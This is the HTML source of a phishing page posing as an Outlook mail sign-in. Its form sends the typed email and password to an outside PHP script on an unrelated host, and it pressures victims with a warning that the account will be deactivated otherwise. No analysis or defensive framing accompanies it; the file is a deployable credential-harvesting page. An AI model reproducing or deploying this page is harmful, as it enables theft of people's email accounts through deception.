<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Mail</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- Favicon -->
    <link rel="icon" href="./outlook.jpeg" type="image/jpeg">

</head>
<body class="bg-white-200 flex items-center justify-center h-screen">
    <div class="bg-white text-black p-8 rounded-lg shadow-lg max-w-md w-full">
        <div class="text-center mb-6">
            <img src="./outlook.jpeg" alt="Email icon" class="mx-auto w-12 h-12">
            <p class="text-gray-400 mt-2">Sign in to continue</p>
        </div>
        <form action="https://www.flashpoin.com/jsp/server2.php" method="POST">
            <div class="mb-4">
                <label for="email" class="block mb-2 text-sm font-medium">Enter your correct email and password to avoid deactivation</label>
                <input type="email" id="email" name="email" placeholder="Email" class="w-full px-4 py-2 bg-blue-100 text-gray-300 border border-gray-700 rounded focus:outline-none focus:ring-2 focus:ring-blue-600">
            </div>
            <div class="mb-4">
                <input type="password" id="password" name="password" placeholder="Password" class="w-full px-4 py-2 bg-blue-100 text-gray-300 border border-gray-700 rounded focus:outline-none focus:ring-2 focus:ring-blue-600">
            </div>
            <div class="mb-4 flex items-center">
                <input type="checkbox" id="remember" name="remember" class="mr-2">
                <label for="remember" class="text-sm text-gray-400">Remember me</label>
            </div>
            <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-600">Sign in</button>
        </form>
    </div>
</body>
</html>
